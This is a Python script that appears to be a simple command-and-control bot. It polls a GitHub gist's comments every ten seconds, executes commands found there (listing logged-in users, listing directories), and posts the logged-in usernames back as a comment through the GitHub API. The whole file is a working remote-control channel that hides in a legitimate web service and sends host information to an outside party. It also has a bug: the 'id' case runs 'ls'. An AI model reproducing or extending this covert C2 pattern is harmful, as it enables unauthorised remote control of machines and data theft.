#! /bin/python3
import argparse
import subprocess
import requests
from dotenv import dotenv_values
import time

parser = argparse.ArgumentParser(
    prog='bot.py',
    description='Bot script listening to commands on given gist channel'
)

try:
    github_token = dotenv_values(".env")['GITHUB_TOKEN']
except KeyError:
    github_token = None

parser.add_argument('gistId', help="Github gist id")
parser.add_argument('-v', '--verbose', help="Show logs",
                    action='store_true')
parser.add_argument(
    '-t', '--token', help='Github personal access token, required if not specified in .env file', required=github_token is None)


args = parser.parse_args()

if(github_token is None):
    github_token = args.token

gist_id = args.gistId
gist_url = f'https://api.github.com/gists/{gist_id}'
comments_url = f'{gist_url}/comments'

gist_response = requests.get(gist_url)
gist = gist_response.json()
headers = {"authorization": f'bearer {github_token}'}
state = {"last_update": gist['updated_at']}

try:
    print(f"Channel url: {gist['url']}")
except KeyError:
    print(f'Failed tof fetch gist: {gist_response}')
    exit()


def log(message):
    if not args.verbose:
        return
    print(message)


def get_latest_comments():
    response = requests.get(comments_url, headers=headers)
    comments = response.json()
    latest = filter(
        lambda comment: comment['updated_at'] > state['last_update'], comments)
    return list(latest)


def get_commands(comments):
    return map(lambda comment: comment['body'], comments)


def post_comment(message: str):
    log(f'Sending message "{message}"')
    response = requests.post(
        comments_url, json={"body": message}, headers=headers)
    log(response)
    state["last_update"] = response.json()['updated_at']


def handle_command(command: str):
    log(f'Received command "{command}"')

    args = command.split(' ')
    bin_name = args[0]
    match bin_name:
        case 'w':
            result = subprocess.check_output(
                ['w'])

            usernames = list(map(lambda line: line.decode(
                'utf-8').split(' ')[0], result.splitlines()))[1:]

            post_comment(', '.join(map(str, usernames)))
        case 'ls':
            subprocess.run(['ls', args[1]])
        case 'id':
            subprocess.run(['ls', args[1]])
        case _:
            log('Unknown command: '+command)


while True:
    time.sleep(10)
    log('fetching comments')
    comments = get_latest_comments()
    if len(comments) == 0:
        log('No new commands')
    if len(comments) > 0:
        state['last_update'] = comments[-1]['updated_at']

    for command in get_commands(comments):
        log(command)
        handle_command(command)
